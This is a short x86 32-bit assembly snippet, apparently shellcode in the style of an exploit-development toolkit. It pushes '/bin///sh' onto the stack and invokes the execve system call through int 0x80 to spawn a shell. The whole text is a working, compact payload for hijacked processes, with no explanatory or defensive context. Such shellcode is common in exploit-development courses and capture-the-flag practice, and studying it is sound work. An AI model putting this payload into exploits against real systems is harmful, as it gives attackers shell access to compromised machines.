bits 32
;; push '/bin///sh\x00'
push 0x68
push 0x732f2f2f
push 0x6e69622f

;; call execve('esp', 0, 0)
mov ebx, esp
xor ecx, ecx
push 0xb
pop eax
cdq ;; Set edx to 0, eax is known to be positive
int 0x80